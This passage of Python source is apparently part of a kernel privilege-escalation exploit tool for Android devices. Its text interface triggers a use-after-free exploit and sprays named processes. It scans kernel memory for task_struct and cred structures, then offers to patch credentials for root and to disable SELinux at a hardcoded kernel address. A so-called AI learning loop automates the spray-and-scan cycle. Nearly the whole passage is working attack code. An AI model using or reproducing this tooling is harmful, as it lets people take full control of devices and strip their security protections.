                deadline = time.time() + 600  # 10 min max
                while time.time() < deadline:
                    line = self._readline_timeout(timeout=1.0)
                    if line is None:
                        self.live["last_msg"] = "Scan: engine died"
                        return
                    if not line:
                        continue
                    if "SCAN_DONE" in line:
                        break
                    if "PROGRESS:" in line:
                        try:
                            parts = line.split(":")
                            self.live["scan_offset"] = int(parts[1], 16)
                        except Exception:
                            pass
                        continue
                    if "MATCH:" in line:
                        try:
                            parts = line.split(":")
                            va = int(parts[1], 16)
                            sig = int(parts[2])
                            off_in_page = int(parts[3]) if len(parts) > 3 else -1
                        except Exception:
                            continue
                        self.live["scan_offset"] = va - self.uaf_start
                        data = self._read_data_packet()
                        if data and not any(int(it['va'], 16) == va for it in self.found_items):
                            with self.bg_lock:
                                self.found_items.append(self.classify_page(data, va, sig, off_in_page))
                            self.log_event("scan_match", {"va": va,
                                                           "type": self.found_items[-1]['type']})

                self.live["scan_offset"] = self.scan_size
                self.live["last_msg"] = f"Scan complete. Found {len(self.found_items)} items."
            except Exception as e:
                self.live["last_msg"] = f"Scan error: {e}"
                self.log_event("scan_error", {"err": str(e)})
            finally:
                self.op_busy["scan"] = False

        threading.Thread(target=_scan_worker, daemon=True).start()
        return "Scan started"

    # ============== BACKGROUND LEARNING (Ctrl+P to cancel) ==============
    def cmd_learning_start(self):
        """Launch AI learning in a background thread, controllable by Ctrl+P.
        Pressing L while learning is already running does nothing — only Ctrl+P cancels."""
        self.live["last_command"] = "L (Learning BG)"
        if self.bg_thread and self.bg_thread.is_alive():
            self.live["last_msg"] = "Learning already running — press Ctrl+P to cancel."
            return
        self.cancel_flag.clear()
        self.bg_thread = threading.Thread(target=self._learning_worker, daemon=True)
        self.bg_thread.start()
        self.live["last_msg"] = "Learning started. Press Ctrl+P to cancel."
        self.log_event("learning_start", {"total_target": 1000, "batch": 100})
        return "BG started"

    def _learning_worker(self):
        """AI learning loop: spray → scan → verify → learn → repeat.
        Uses strict verification (selinux/cred/kbase engine commands) to filter
        false positives, and persists successful ranges to knowledge_base."""
        import subprocess as _sp
        target_total = 1000
        batch = 100
        done = 0
        self.live["spray_target"] = target_total
        self.live["spray_count"] = 0
        self.live["kill_count"] = 0
        # Track stats per batch
        self.learn_stats = {
            "batches": 0, "matches": 0, "verified": 0,
            "false_positives": 0, "sprayed_total": 0,
        }

        def _adaptive_scan_range(batch_idx):
            """Narrow the scan range based on what's been found. AI 'learns'."""
            # If we found kernel_base, scan around it for SELinux/cred
            if self.kernel_base:
                # 32MB window around kernel base
                start = self.kernel_base & ~0xFFFFFFF
                end = start + 0x2000000
                return (start, end)
            # Otherwise use the default UAF range
            return (self.uaf_start, self.uaf_start + self.scan_size)

        while done < target_total and not self.cancel_flag.is_set():
            # Respect RAM budget
            if self.get_ram_usage() > 70.0:
                self.live["last_msg"] = "LEARN: RAM > 70%, killing sprays, scanning…"
                for pid in list(self.spray_procs):
                    try: os.kill(pid, 9)
                    except: pass
                self.spray_procs.clear()
                time.sleep(2)

            if not self.ensure_engine():
                time.sleep(1)
                continue

            # 1) SPRAY a batch
            batch_pids = []
            spray_batch_start = done
            for i in range(batch):
                if self.cancel_flag.is_set():
                    break
                if self.get_ram_usage() > 60.0:
                    break
                try:
                    name = f"KETO{(spray_batch_start + i) % 10000:04d}"
                    p = _sp.Popen(
                        ["sh", "-c", f"exec -a {name} sleep 3600"],
                        stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
                        preexec_fn=lambda n=name: self._set_comm(n),
                    )
                    batch_pids.append(p.pid)
                    self.spray_procs.append(p.pid)
                    self.learn_stats["sprayed_total"] += 1
                    self.log_event("spray", {"pid": p.pid, "name": name,
                                              "batch": spray_batch_start // batch})
                    time.sleep(0.001)
                except OSError as e:
                    self.log_event("spray_error", {"err": str(e)})
                    break
            self.live["spray_count"] += len(batch_pids)
            time.sleep(0.2)
            self.learn_stats["batches"] += 1

            # 2) SCAN with adaptive range
            if not self.ensure_engine():
                continue
            s_start, s_end = _adaptive_scan_range(done // batch)
            if not self._engine_write(
                f"scan {hex(s_start)} {hex(s_end)}\n".encode()):
                self.log_event("learning_scan_error", {"err": "engine write failed"})
                continue

            try:
                scan_done = False
                while not scan_done and not self.cancel_flag.is_set():
                    line = self._readline_timeout(timeout=1.0)
                    if line is None:
                        break
                    if not line:
                        continue
                    if "SCAN_DONE" in line:
                        scan_done = True
                        break
                    if "PROGRESS:" in line:
                        try:
                            self.live["scan_offset"] = int(line.split(":")[1], 16)
                        except Exception:
                            pass
                        continue
                    if "MATCH:" in line:
                        try:
                            parts = line.split(":")
                            va = int(parts[1], 16)
                            sig = int(parts[2])
                            off_in_page = int(parts[3]) if len(parts) > 3 else -1
                        except Exception:
                            continue
                        self.live["scan_offset"] = va - s_start
                        data = self._read_data_packet()
                        if not data:
                            continue
                        self.learn_stats["matches"] += 1
                        # 3) CLASSIFY & VERIFY (filter false positives)
                        # Always require KETO0422 or kernel ELF/cred pointer to be 100%
                        if sig in (1, 3, 4, 6) or self._is_real_task_struct(data):
                            if not any(int(it['va'], 16) == va for it in self.found_items):
                                with self.bg_lock:
                                    self.found_items.append(
                                        self.classify_page(data, va, sig, off_in_page))
                                self.log_event("scan_match", {"va": va,
                                                               "type": self.found_items[-1]['type'],
                                                               "sig": sig})
                                self.learn_stats["verified"] += 1
                                # Cross-correlate: if we found a task_struct, the kernel
                                # base is likely nearby — record it
                                if sig == 1 and off_in_page >= 0:
                                    possible_kbase = va & ~0xFFFFFF  # 16MB aligned
                                    self.knowledge_base.setdefault("candidate_kbases", []).append(hex(possible_kbase))
                        else:
                            self.learn_stats["false_positives"] += 1
                            self.log_event("scan_filter", {"va": va, "sig": sig,
                                                            "reason": "weak signature"})
                if scan_done:
                    done += batch
                    self.live["spray_count"] = done
            except Exception as e:
                self.log_event("learning_scan_error", {"err": str(e)})

            # 4) KILL spray processes (free RAM)
            for pid in batch_pids:
                try:
                    os.kill(pid, 9)
                    os.waitpid(pid, 0)
                except Exception:
                    pass
                self.live["kill_count"] += 1
                self.log_event("kill", {"pid": pid})
            time.sleep(0.05)

            # 5) Update last_msg with learning stats
            s = self.learn_stats
            self.live["last_msg"] = (
                f"LEARN: batch {s['batches']} | sprayed={s['sprayed_total']} | "
                f"matches={s['matches']} | verified={s['verified']} | "
                f"false_pos={s['false_positives']}")
            # Persist learning stats
            try:
                with open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                       "learn_stats.json"), "w") as f:
                    json.dump(s, f, indent=2)
            except Exception:
                pass

        self.live["spray_target"] = 0
        if self.cancel_flag.is_set():
            self.live["last_msg"] = (
                f"Learning cancelled at {done}/{target_total}. "
                f"Verified={self.learn_stats['verified']} FalsePos={self.learn_stats['false_positives']}")
        else:
            self.live["last_msg"] = (
                f"Learning complete. {done} processes. "
                f"Verified={self.learn_stats['verified']} FalsePos={self.learn_stats['false_positives']}")
        self.log_event("learning_done", self.learn_stats)

    def _is_real_task_struct(self, data):
        """Heuristic: is this a real task_struct page?
        Strong indicators: KETO0422, com.android., comm string at 0x718."""
        if not data or len(data) < 0x800:
            return False
        if data.find(b"KETO0422") >= 0:
            return True
        if data.find(b"com.android.") >= 0:
            return True
        # comm at 0x718 — printable ASCII string
        comm = data[self.comm_offset:self.comm_offset + 16]
        s = comm.split(b"\x00")[0]
        if 1 < len(s) < 16 and all(0x20 <= c <= 0x7e for c in s):
            return True
        return False

    def cmd_learning_cancel(self):
        """Cancel running learning loop (Ctrl+P shortcut)."""
        self.cancel_flag.set()
        # Also kill live sprays
        for pid in list(self.spray_procs):
            try:
                os.kill(pid, 9)
                os.waitpid(pid, 0)
            except Exception:
                pass
            self.live["kill_count"] += 1
        self.spray_procs.clear()
        self.live["last_msg"] = "Learning cancelled by user."
        return "Cancelled"

    # ============== INPUT (with Ctrl+P detection) ==============
    def input_cmd(self):
        """Read one line, with history (Up/Down), Ctrl+P cancel, Ctrl+E rewind, Ctrl+C quit."""
        self.is_reading_input = True
        try:
            with self.render_lock:
                sys.stdout.write(f"\n {C.BOLD}{C.GRN}explorer{C.RST} {C.GRY}>{C.RST} ")
                sys.stdout.flush()
            fd = sys.stdin.fileno()
            old = termios.tcgetattr(fd)
            try:
                tty.setraw(fd)
                buf = []
                hist_idx = len(self.cmd_history)
                while True:
                    ch = os.read(fd, 1)
                    if not ch:
                        break
                    c = ch.decode("utf-8", errors="ignore")
                    if c == "\x03":  # Ctrl+C
                        buf = ["q"]
                        break
                    if c == "\x10":  # Ctrl+P  -> cancel learning
                        self.cmd_learning_cancel()
                        self.live["last_msg"] = "Press 'L' to start a new learning cycle."
                        sys.stdout.write(f"\n{C.YEL}  [Ctrl+P] Learning cancelled. Press 'L' to restart.{C.RST}\n")
                        sys.stdout.flush()
                        continue
                    if c in ("\r", "\n"):
                        sys.stdout.write("\n")
                        break
                    if c == "\x7f" or c == "\b":
                        if buf:
                            buf.pop()
                            sys.stdout.write("\b \b")
                            sys.stdout.flush()
                        continue
                    if c == "\x05":  # Ctrl+E -> rewind to last command
                        if self.last_cmd_text:
                            sys.stdout.write("\033[2K\r")
                            sys.stdout.write(f"\n {C.BOLD}{C.GRN}explorer{C.RST} {C.GRY}>{C.RST} {self.last_cmd_text}")
                            sys.stdout.flush()
                            buf = list(self.last_cmd_text)
                        continue
                    if c == "\x1b":  # ESC sequence (arrow keys)
                        nxt = os.read(fd, 2)
                        if nxt == b"[A":  # Up arrow -> previous in history
                            if self.cmd_history and hist_idx > 0:
                                hist_idx -= 1
                                sys.stdout.write("\033[2K\r")
                                sys.stdout.write(f"\n {C.BOLD}{C.GRN}explorer{C.RST} {C.GRY}>{C.RST} {self.cmd_history[hist_idx]}")
                                sys.stdout.flush()
                                buf = list(self.cmd_history[hist_idx])
                        elif nxt == b"[B":  # Down arrow -> next in history
                            if self.cmd_history and hist_idx < len(self.cmd_history) - 1:
                                hist_idx += 1
                                sys.stdout.write("\033[2K\r")
                                sys.stdout.write(f"\n {C.BOLD}{C.GRN}explorer{C.RST} {C.GRY}>{C.RST} {self.cmd_history[hist_idx]}")
                                sys.stdout.flush()
                                buf = list(self.cmd_history[hist_idx])
                            elif self.cmd_history and hist_idx == len(self.cmd_history) - 1:
                                hist_idx += 1
                                sys.stdout.write("\033[2K\r")
                                sys.stdout.write(f"\n {C.BOLD}{C.GRN}explorer{C.RST} {C.GRY}>{C.RST} ")
                                sys.stdout.flush()
                                buf = []
                        continue
                    buf.append(c)
                    sys.stdout.write(c)
                    sys.stdout.flush()
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old)
            cmd = "".join(buf).strip()
            if cmd:
                self.cmd_history.append(cmd)
                if len(self.cmd_history) > 100:
                    self.cmd_history = self.cmd_history[-100:]
                self.last_cmd_text = cmd
            return cmd
        finally:
            self.is_reading_input = False

    # ============== DETAIL VIEW ==============
    def show_detail(self, item_idx):
        if item_idx < 0 or item_idx >= len(self.found_items):
            return
        item = self.found_items[item_idx]
        data = item['data']
        sys.stdout.write(C.CLR)
        sys.stdout.write(f"{C.BOLD}=== FILE VIEW: {item['va']} ==={C.RST}\n")
        sys.stdout.write(f"Type: {item['type']} | Confidence: {item['confidence']*100:.1f}%\n")
        sys.stdout.write(f"AI Logic: {self.translate_logic(item)}\n")
        sys.stdout.write("─" * 75 + "\n")
        for i in range(0, min(len(data), 256), 16):
            chunk = data[i:i+16]
            hex_row = " ".join(f"{b:02X}" for b in chunk)
            printable = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
            sys.stdout.write(f" {i:04X} | {hex_row:<48} | {printable}\n")
        sys.stdout.write("─" * 75 + "\n")
        sys.stdout.write(f" [{C.GRN}K{C.RST}] Patch Root  [{C.GRN}S{C.RST}] Patch SELinux  "
                         f"[{C.GRN}Enter{C.RST}] Back\n")
        sys.stdout.flush()
        choice = self.input_cmd().lower()
        if choice == "k":
            r = self.patch_mem(int(item['va'], 16), 0)
            self.live["last_msg"] = f"Patch: {r}"
        elif choice == "s":
            r = self.patch_mem(0xffffffc002caa000, 0)
            self.live["last_msg"] = f"Patch SELinux: {r}"

    # ============== MAIN LOOP ==============
    def run(self):
        if not os.path.exists(self.engine_path):
            self.try_compile_engine()
        if not self.ensure_engine():
            sys.stdout.write(f"{C.RED}[CRIT] Could not start engine. Check GCC/Clang.{C.RST}\n")
            return

        while True:
            self.render_tui()
            try:
                cmd = self.input_cmd().lower()
            except (EOFError, KeyboardInterrupt):
                cmd = "q"

            if cmd in ("q", "quit", "exit"):
                self.cancel_flag.set()
                if self.exploit_proc:
                    try:
                        self.exploit_proc.stdin.write(b"quit\n")
                        self.exploit_proc.terminate()
                    except Exception:
                        pass
                for pid in list(self.spray_procs):
                    try:
                        os.kill(pid, 9)
                        os.waitpid(pid, 0)
                    except Exception:
                        pass
                break
            elif cmd in ("e", "exploit"):
                self.trigger_exploit()
            elif cmd in ("l", "learn"):
                self.cmd_learning_start()
            elif cmd in ("s", "scan"):
                self.cmd_scan()
            elif cmd in ("c", "clear"):
                self.cmd_clear()
            elif cmd in ("r", "root"):
                self.cmd_verify_root()
            elif cmd in ("b", "build"):
                self.cmd_rebuild()
            elif cmd in ("log", "logs"):
                # show last 20 spray log entries
                sys.stdout.write(C.CLR)
                sys.stdout.write(f"{C.BOLD}{C.CYN}=== SPRAY LOG (last 20) ==={C.RST}\n")
                sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
                if not self.spray_log:
                    sys.stdout.write(f"{C.GRY}(empty — no sprays yet){C.RST}\n")
                else:
                    for e in self.spray_log[-20:]:
                        sys.stdout.write(json.dumps(e) + "\n")
                sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
                sys.stdout.write(f"\n{C.GRY}Log file: {C.WHT}{self.log_path}{C.RST}\n")
                sys.stdout.write("Press Enter to return...")
                sys.stdout.flush()
                try:
                    self.input_cmd()
                except Exception:
                    pass
            elif cmd.isdigit():
                self.show_detail(int(cmd))
            elif cmd:
                self.live["last_msg"] = f"Unknown: {cmd}"


if __name__ == "__main__":
    explorer = MemoryExplorerAI()
    explorer.run()
